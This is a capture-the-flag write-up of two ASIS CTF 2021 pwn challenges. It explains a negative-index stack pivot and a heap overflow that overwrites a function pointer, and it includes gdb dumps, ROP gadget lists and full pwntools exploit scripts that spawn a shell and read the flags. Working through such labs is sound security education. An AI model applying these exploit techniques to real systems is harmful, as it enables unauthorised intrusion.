Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.
You can find the related files [here](https://github.com/ret2school/ctf/blob/master/2021/asisctf).

# justpwnit

justpwnit was a warmup pwn challenge. That's only a basic stack overflow.
The binary is statically linked and here is the checksec's output:

```
[*] '/home/nasm/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Morever the source code is provided as it is the case for all the pwn tasks !
Here it is:
```c
/*
 * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define STR_SIZE 0x80

void set_element(char **parray) {
  int index;
  printf("Index: ");
  if (scanf("%d%*c", &index) != 1)
    exit(1);
  if (!(parray[index] = (char*)calloc(sizeof(char), STR_SIZE)))
    exit(1);
  printf("Data: ");
  if (!fgets(parray[index], STR_SIZE, stdin))
    exit(1);
}

void justpwnit() {
  char *array[4];
  for (int i = 0; i < 4; i++) {
    set_element(array);
  }
}

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(180);
  justpwnit();
  return 0;
}
```

The program is basically reading `STR_SIZE` bytes into `parray[index]`, the issue is that there is no check on the user controlled index from which we choose were write the input.
Furthermore, `index` is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved `$rbp` value of the `set_element` stackframe by a heap pointer to our input. By this way at the end of the pwninit, the `leave` instruction will pivot the stack from the original state to a pointer to the user input.

Let's see this in gdb !

```
00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
02:0010│         0x7ffef03864f0 ◂— 0x0
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */
04:0020│         0x7ffef0386500 ◂— 0x0
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64 
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
08:0040│ rax     0x7ffef0386520 ◂— 0xb4
09:0048│         0x7ffef0386528 ◂— 0x0
... ↓            4 skipped
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0
```

That's the stack's state when we are calling calloc. We can see the `set_element`'s stackframe which ends up in `$rsp+38` with the saved return address. And right after we see that `$rax` contains the address of the `parray` buffer. Which means that if we send -2 as index, `$rbp` will point to the newly allocated buffer to chich we will write right after with `fgets`.

Then, if we do so, the stack's state looks like this:

```
00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */                                                                                                                              
04:0020│         0x7ffef0386500 ◂— 0x0                                                                                                                                                         
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64                                                                                                                                  
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0                                                                                                                                       
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1                                                                                                    
08:0040│         0x7ffef0386520 ◂— 0xb4                                                                                                                                                        
09:0048│         0x7ffef0386528 ◂— 0x0                                                                                                                                                         
... ↓            4 skipped                                                                                                                                                                     
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1                                                                                                                                       
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0                                                                                                                         
```

The saved `$rbp` has been overwritten with a pointer to the user input. Then, at the end of the `set_element` function, `$rbp` is popped from the stack and contains a pointer to the user input. Which causes at the end of the `justpwnit` function, the `leave` instruction moves the pointer to the user input in `$rsp`.

## ROPchain

Once we can pivot the stack to makes it point to some user controlled areas, we just have to rop through all the gadgets we can find in the binary.
The binary is statically linked, so we can't make a ret2system, we have to make a `execve("/bin/sh\0", NULL, NULL)`.

And so what we need is:
- pop rdi gadget
- pop rsi gadget
- pop rdx gadget
- pop rax gadget
- syscall gadget
- mov qword ptr [reg], reg [to write "/bin/sh\0"] in a writable area

We can easily find these gadgets with the help (ROPgadget)[https://github.com/JonathanSalwan/ROPgadget].
We got:

```
0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
0x0000000000401001 : pop rax ; ret
0x00000000004019a3 : pop rsi ; ret
0x00000000004013e9 : syscall
0x0000000000403d23 : pop rdx ; ret
0x0000000000401b0d : pop rdi ; ret
```

Now we just have to craft the ropchain !

```py
POP_RDI = 0x0000000000401b0d
POP_RDX = 0x0000000000403d23
SYSCALL = 0x00000000004013e9
POP_RAX = 0x0000000000401001
POP_RSI = 0x00000000004019a3

MOV_RSI_PTR_RAX = 0x0000000000406c32
PT_LOAD_W = 0x00000000040c240

pld = pwn.p64(0) + pwn.p64(POP_RSI) + b"/bin/sh\x00"
pld += pwn.p64(POP_RAX) + pwn.p64(PT_LOAD_W)
pld += pwn.p64(MOV_RSI_PTR_RAX)
pld += pwn.p64(POP_RAX) + pwn.p64(0x3b)
pld += pwn.p64(POP_RDI) + pwn.p64(PT_LOAD_W)
pld += pwn.p64(POP_RSI) + pwn.p64(0)
pld += pwn.p64(POP_RDX) + pwn.p64(0x0)
pld += pwn.p64(SYSCALL)
```

And we can enjoy the shell !

```
➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
[*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 168.119.108.148 on port 11010: Done
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls
chall
flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
```

## Full exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('justpwnit')
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
gdbscript = '''
source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
set follow-fork-mode parent
b* main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
io.sendlineafter(b"Index: ", b"-2")

# 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
# 0x0000000000401001 : pop rax ; ret
# 0x00000000004019a3 : pop rsi ; ret
# 0x00000000004013e9 : syscall
# 0x0000000000403d23 : pop rdx ; ret
# 0x0000000000401b0d : pop rdi ; ret

POP_RDI = 0x0000000000401b0d
POP_RDX = 0x0000000000403d23
SYSCALL = 0x00000000004013e9
POP_RAX = 0x0000000000401001
POP_RSI = 0x00000000004019a3

MOV_RSI_PTR_RAX = 0x0000000000406c32

PT_LOAD_W = 0x00000000040c240

pld = pwn.p64(0) + pwn.p64(POP_RSI) + b"/bin/sh\x00"
pld += pwn.p64(POP_RAX) + pwn.p64(PT_LOAD_W)
pld += pwn.p64(MOV_RSI_PTR_RAX)
pld += pwn.p64(POP_RAX) + pwn.p64(0x3b)
pld += pwn.p64(POP_RDI) + pwn.p64(PT_LOAD_W)
pld += pwn.p64(POP_RSI) + pwn.p64(0)
pld += pwn.p64(POP_RDX) + pwn.p64(0x0)
pld += pwn.p64(SYSCALL)

io.sendlineafter(b"Data: ", pld)

io.interactive()
```

# abbr

abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the `justpwnit` challenge (the binary is also statically linked).

Here is the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include "rules.h"

typedef struct Translator {
  void (*translate)(char*);
  char *text;
  int size;
} Translator;

void english_expand(char *text) {
  int i, alen, blen;
  Rule *r;
  char *p, *q;
  char *end = &text[strlen(text)-1]; // pointer to the last character

  /* Replace all abbreviations */
  for (p = text; *p; ++p) {
    for (i = 0; i < sizeof(rules) / sizeof(Rule); i++) {
      r = &rules[i];
      alen = strlen(r->a);
      blen = strlen(r->b);
      if (strncasecmp(p, r->a, alen) == 0) {
        // i.e "i'm pwn noob." --> "i'm pwn XXnoob."
        for (q = end; q > p; --q)
          *(q+blen-alen) = *q;
        // Update end
        end += blen-alen;
        *(end+1) = '\0';
        // i.e "i'm pwn XXnoob." --> "i'm pwn newbie."
        memcpy(p, r->b, blen);
      }
    }
  }
}

Translator *translator_new(int size) {
  Translator *t;

  /* Allocate region for text */
  char *text = (char*)calloc(sizeof(char), size);
  if (text == NULL)
    return NULL;

  /* Initialize translator */
  t = (Translator*)malloc(sizeof(Translator));
  t->text = text;
  t->size = size;
  t->translate = english_expand;

  return t;
}

void translator_reset(Translator *t) {
  memset(t->text, 0, t->size);
}

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);

  Translator *t = translator_new(0x1000);
  while (1) {
    /* Input data */
    translator_reset(t);
    printf("Enter text: ");
    fgets(t->text, t->size, stdin);
    if (t->text[0] == '\n')
      break;

    /* Expand abbreviation */
    t->translate(t->text);
    printf("Result: %s", t->text);
  }

  return 0;
}
```

The `rules.h` looks like this:
```c
typedef struct {
  char *a; // abbreviated string (i.e "asap")
  char *b; // expanded string (i.e "as soon as possible")
} Rule;

// Why are there so many abbreviations in English!!?? :exploding_head:
Rule rules[] =
  {
   {.a="2f4u", .b="too fast for you"},
   {.a="4yeo", .b="for your eyes only"},
   {.a="fyeo", .b="for your eyes only"},
   {.a="aamof", .b="as a matter of fact"},
   {.a="afaik", .b="as far as i know"},
   {.a="afk", .b="away from keyboard"},
   {.a="aka", .b="also known as"},
   {.a="b2k", .b="back to keyboard"},
   {.a="btk", .b="back to keyboard"},
   {.a="btt", .b="back to topic"},
   {.a="btw", .b="by the way"},
   {.a="b/c", .b="because"},
   {.a="c&p", .b="copy and paste"},
   {.a="cys", .b="check your settings"},
   {.a="diy", .b="do it yourself"},
   {.a="eobd", .b="end of business day"},
   {.a="faq", .b="frequently asked questions"},
   {.a="fka", .b="formerly known as"},
   {.a="fwiw", .b="for what it's worth"},
   {.a="fyi", .b="for your information"},
   {.a="jfyi", .b="just for your information"},
   {.a="hf", .b="have fun"},
   {.a="hth", .b="hope this helps"},
   {.a="idk", .b="i don't know"},
   {.a="iirc", .b="if i remember correctly"},
   {.a="imho", .b="in my humble opinion"},
   {.a="imo", .b="in my opinion"},
   {.a="imnsho", .b="in my not so humble opinion"},
   {.a="iow", .b="in other words"},
   {.a="itt", .b="in this thread"},
   {.a="dgmw", .b="don't get me wrong"},
   {.a="mmw", .b="mark my words"},
   {.a="nntr", .b="no need to reply"},
   {.a="noob", .b="newbie"},
   {.a="noyb", .b="none of your business"},
   {.a="nrn", .b="no reply necessary"},
   {.a="otoh", .b="on the other hand"},
   {.a="rtfm", .b="read the fine manual"},
   {.a="scnr", .b="sorry, could not resist"},
   {.a="sflr", .b="sorry for late reply"},
   {.a="tba", .b="to be announced"},
   {.a="tbc", .b="to be continued"},
   {.a="tia", .b="thanks in advance"},
   {.a="tq", .b="thank you"},
   {.a="tyvm", .b="thank you very much"},
   {.a="tyt", .b="take your time"},
   {.a="ttyl", .b="talk to you later"},
   {.a="wfm", .b="works for me"},
   {.a="wtf", .b="what the fuck"},
   {.a="wrt", .b="with regard to"},
   {.a="ymmd", .b="you made my day"},
   {.a="icymi", .b="in case you missed it"},
   // pwners abbreviations
   {.a="rop ", .b="return oriented programming "},
   {.a="jop ", .b="jump oriented programming "},
   {.a="cop ", .b="call oriented programming "},
   {.a="aar", .b="arbitrary address read"},
   {.a="aaw", .b="arbitrary address write"},
   {.a="www", .b="write what where"},
   {.a="oob", .b="out of bounds"},
   {.a="ret2", .b="return to "},
  };
```

The main stuff is in `english_expand` function which is looking for an abreviation in the user input. If it finds the abbreviation, all the data after the occurence will be written further according to the length of the full expression.
The attack idea is fairly simple, the `text` variable is allocated right before the `Translator` structure, and so in the heap they will be contiguous. Given that, we know that if we send 0x1000 bytes in the chunk contained by `text` and that we put an abbreviation of the right length we can overwrite the `translate` function pointer.

I will not describe in details how we can find the right size for the abbreviation or the length off the necessary padding.
An interesting abbreviation is the `www`, which stands for "write what where" (what a nice abbreviation for a pwner lmao), indeed the expanded expression has a length of 16 bytes.
So we send `b"wwwwww" + b"A"*(0x1000-16) + pwn.p64(gadget)`, we will overflow the 32 first bytes next the `text` chunk, and in this rewrite the `translator` function pointer.

## ROPchain

Once that's done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
Lets take a look at the values of the registers when we trigger the function pointer:
```
 RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
 RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp
 RDI  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 RSI  0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* '\n' */
 R8   0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 R9   0x0
 R10  0x49e522 ◂— 'Enter text: '
 R11  0x246
 R12  0x4030e0 (__libc_csu_fini) ◂— endbr64 
 R13  0x0
 R14  0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 
 R15  0x0
 RBP  0x7ffdef1b8230 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 
 RSP  0x7ffdef1b8220 ◂— 0x0
 RIP  0x402036 (main+190) ◂— call   rdx
```
`$rax` points to the newly readen input, same for `$r8` and `$rdi` and `$rdx` contains the location to which we will jmp on.
So we can search gadgets like `mov rsp, rax`, `mov rsp, rdi`, `mov rsp, r8` and so on. But I didn't find any gadgets like that, so I looked for `xchg rsp` gadgets, and I finally found a `xchg eax, esp` gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that's perfect!

Now we can make `$rsp` to point to the user input, we make a similar ropchain as the last challenge, and that's enough to get a shell!
```py

# 0x00000000004126e3 : call qword ptr [rax]
# 0x0000000000485fd2 : xchg eax, ebp ; ret
# 0x0000000000405121 : xchg eax, esp ; ret

pld = b"wwwwww"
pld += b"A"*(0x1000-16) + pwn.p64(0x0000000000405121)
io.sendlineafter("Enter text: ", pld)

# 0x000000000045a8f7 : pop rax ; ret
# 0x0000000000404cfe : pop rsi ; ret
# 0x00000000004018da : pop rdi ; ret
# 0x00000000004017df : pop rdx ; ret
# 0x000000000045684f : mov qword ptr [rdi], rsi ; ret

DATA_SEC = 0x0000000004c90e0
POP_RDI = 0x00000000004018da
POP_RSI = 0x0000000000404cfe
POP_RAX = 0x000000000045a8f7
POP_RDX = 0x00000000004017df
MOV_PTR_RDI_RSI = 0x000000000045684f
SYSCALL = 0x00000000004012e3 # syscall

pld = pwn.p64(POP_RDI)
pld += pwn.p64(DATA_SEC)
pld += pwn.p64(POP_RSI)
pld += b"/bin/sh\x00"
pld += pwn.p64(MOV_PTR_RDI_RSI)
pld += pwn.p64(POP_RSI)
pld += pwn.p64(0x0)
pld += pwn.p64(POP_RDX)
pld += pwn.p64(0x0)
pld += pwn.p64(POP_RAX)
pld += pwn.p64(0x3b)
pld += pwn.p64(SYSCALL)
```

We launch the script with the right arguments and we correctly pop a shell!

```
➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 168.119.108.148 on port 10010: Done
/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls
chall
flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
```

## Final exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('abbr')
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
b* 0x402036
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# 000000000048ac90    80 FUNC    GLOBAL DEFAULT    7 _dl_make_stack_executable
# 0x0000000000422930 : add rsp, 0x10 ; pop rbp ; ret

# 0x00000000004126e3 : call qword ptr [rax]
# 0x0000000000485fd2 : xchg eax, ebp ; ret
# 0x0000000000405121 : xchg eax, esp ; ret

pld = b"wwwwww"
pld += b"A"*(0x1000-16) + pwn.p64(0x0000000000405121)
io.sendlineafter("Enter text: ", pld)

# 0x000000000045a8f7 : pop rax ; ret
# 0x0000000000404cfe : pop rsi ; ret
# 0x00000000004018da : pop rdi ; ret
# 0x00000000004017df : pop rdx ; ret
# 0x000000000045684f : mov qword ptr [rdi], rsi ; ret

DATA_SEC = 0x0000000004c90e0
POP_RDI = 0x00000000004018da
POP_RSI = 0x0000000000404cfe
POP_RAX = 0x000000000045a8f7
POP_RDX = 0x00000000004017df
MOV_PTR_RDI_RSI = 0x000000000045684f
SYSCALL = 0x00000000004012e3 # syscall

pld = pwn.p64(POP_RDI)
pld += pwn.p64(DATA_SEC)
pld += pwn.p64(POP_RSI)
pld += b"/bin/sh\x00"
pld += pwn.p64(MOV_PTR_RDI_RSI)
pld += pwn.p64(POP_RSI)
pld += pwn.p64(0x0)
pld += pwn.p64(POP_RDX)
pld += pwn.p64(0x0)
pld += pwn.p64(POP_RAX)
pld += pwn.p64(0x3b)
pld += pwn.p64(SYSCALL)

io.sendlineafter("Enter text: ", pld)
io.interactive()
```
